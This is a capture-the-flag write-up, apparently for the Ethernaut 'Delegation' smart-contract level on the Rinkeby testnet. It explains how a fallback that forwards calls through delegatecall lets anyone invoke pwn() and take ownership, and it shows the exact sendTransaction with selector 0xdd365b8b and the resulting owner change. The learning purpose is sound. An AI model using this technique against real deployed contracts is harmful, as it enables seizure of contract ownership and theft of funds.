# SOLUTION
## Links

Target: https://rinkeby.etherscan.io/address/0xaA6eE422C66BAb310F2d36cc11646a3fce498983

Secondary: https://rinkeby.etherscan.io/address/0x9451961b7Aea1Df57bc20CC68D72f662241b5493
Exploit: 

With the instance address we can first see the internal transaction for constructor call with address param 0x9451961b7Aea1Df57bc20CC68D72f662241b5493 whtch is the delegate contract

Now if we track that address too we can see delegate's contructor call that take an owner address as param https://rinkeby.etherscan.io/tx/0xa85872e0e6c45de99e882d013fedda5fa5bbe503927fa6488e50d5a4df1f72e5

Same as 

	await contract.owner()	
	'0x9451961b7Aea1Df57bc20CC68D72f662241b5493'

Whitch is msg.sender (from) of the contract creation

Now the vulnarabilty here is the the context of delegateCall, they call the target but keep the sender context so heach target action is reflected not on it's variables but on the senders.

Our goal is to call pwn() from Delegate throw the fallback function of Delegation by doing a delegatecall
pwn() will change the owner not of it's own context but of Delegation

To do that we need the function signature
https://rinkeby.etherscan.io/tx/0x96415dee91d72b96a073e73fd9ba9c6e532c443ff9cd5da94de88cf257608d49

	Function: pwn() ***

	MethodID: 0xdd365b8b

Now to call the fallback function of delegation 
https://rinkeby.etherscan.io/tx/0x5de4a5d9daed240a352f0cbfd821cc55e8632fff4747a0e483b5316c6041d537
	
	await contract.owner()
	'0x9451961b7Aea1Df57bc20CC68D72f662241b5493'

	await sendTransaction({from: "0x6E81372783990a13715857888B32325621DB44E2", to: "0xaA6eE422C66BAb310F2d36cc11646a3fce498983", value: toWei("0"), data: "0xdd365b8b"})

	await contract.owner()
	'0x6E81372783990a13715857888B32325621DB44E2'

## Level completed!

Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the The Parity Wallet Hack Explained article for an accurate explanation of how this idea was used to steal 30M USD.